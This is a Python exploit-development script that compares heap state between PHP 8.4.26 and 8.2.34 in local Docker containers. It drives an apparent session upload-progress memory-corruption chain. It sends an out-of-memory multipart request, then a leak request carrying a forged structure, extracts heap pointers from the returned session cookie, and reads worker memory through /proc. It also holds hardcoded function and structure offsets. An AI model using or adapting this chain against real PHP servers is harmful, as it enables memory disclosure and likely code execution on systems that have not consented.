"""Compare 8.4.26 (working) vs 8.2.34 (broken) stage-1 heap state after OOM."""
import sys, os, time, struct, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

CONTAINERS = {
    "8.4.26": {"container": "p2s8426", "port": 18113, "zif": 0x465370, "dtor": 0x65eb60, "htdata": 0x690D8},
    "8.2.34": {"container": "p2s8234", "port": 18111, "zif": 0x39b8a0, "dtor": 0x487650, "htdata": 0x690d8},
}

def read_mem(container, wpid, addr, count):
    dec = str(addr)
    r = subprocess.run(
        ["docker", "exec", container, "sh", "-c",
         f"dd if=/proc/{wpid}/mem bs=1 skip={dec} count={count} 2>/dev/null"],
        capture_output=True)
    return r.stdout

def get_worker_pid(container):
    r = subprocess.run(
        ["docker", "exec", container, "sh", "-c",
         "ps aux | grep apache2 | grep www-data | grep -v grep | awk '{print $2}' | head -1"],
        capture_output=True, text=True)
    return r.stdout.strip()

def get_libphp_base(container, wpid):
    r = subprocess.run(
        ["docker", "exec", container, "sh", "-c",
         f"grep libphp /proc/{wpid}/maps | head -1"],
        capture_output=True, text=True)
    line = r.stdout.strip()
    if not line:
        return 0
    return int(line.split("-")[0], 16)

def fire_oom(port, big_mb=12):
    t = E.Target(f"http://127.0.0.1:{port}/", timeout=90.0, verbose=False)
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (big_mb * 1024 * 1024)},
    ]
    try:
        t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
    except Exception:
        pass
    time.sleep(0.3)

def fire_leak(port, n=841):
    t = E.Target(f"http://127.0.0.1:{port}/", timeout=90.0, verbose=False)
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(n):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    resp = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=90.0)
    return E.parse_cookie(resp)

def analyze_cookie(raw, label):
    print(f"\n=== {label}: cookie len={len(raw)} ===", flush=True)
    if len(raw) < 16:
        print("  [no leak]", flush=True)
        return
    c2m = Counter()
    for i in range(0, len(raw) - 8, 8):
        v = int.from_bytes(raw[i:i + 8], "little")
        if 0x700000000000 <= v < 0x800000000000:
            c2m[v & ~0x1FFFFF] += 1
    if c2m:
        top = c2m.most_common(5)
        print(f"  2MB-aligned heap ptrs: {[(hex(k), v) for k, v in top]}", flush=True)
    else:
        print("  [no 2MB-aligned heap ptrs]", flush=True)
    print(f"  first 96B: {raw[:96].hex()}", flush=True)

for ver, cfg in CONTAINERS.items():
    print(f"\n########## {ver} ##########", flush=True)
    container = cfg["container"]
    port = cfg["port"]

    wpid = get_worker_pid(container)
    base = get_libphp_base(container, wpid)
    print(f"  worker PID={wpid} libphp base=0x{base:x}", flush=True)

    # Fire OOM
    fire_oom(port)
    time.sleep(0.5)

    # Fire leak request and capture cookie
    raw = fire_leak(port)
    analyze_cookie(raw, f"{ver} stage-1 leak")

    # Read ps_globals (first 0x200 bytes)
    psg = base + 0x1316820 if ver == "8.4.26" else base + 0xf3a120
    data = read_mem(container, wpid, psg, 0x200)
    if len(data) >= 0x40:
        print(f"  ps_globals first 64B: {data[:64].hex()}", flush=True)
        # session_status is at +0x68 (8.4.26) or +0x60 (8.2.34)
        for off in [0x60, 0x68]:
            ss = struct.unpack_from("<i", data, off)[0]
            print(f"    ps_g+0x{off:x} = {ss} (session_status? 0=disabled 1=none 2=active)", flush=True)
    else:
        print(f"  [ps_globals read failed: {len(data)} bytes]", flush=True)

    time.sleep(1)
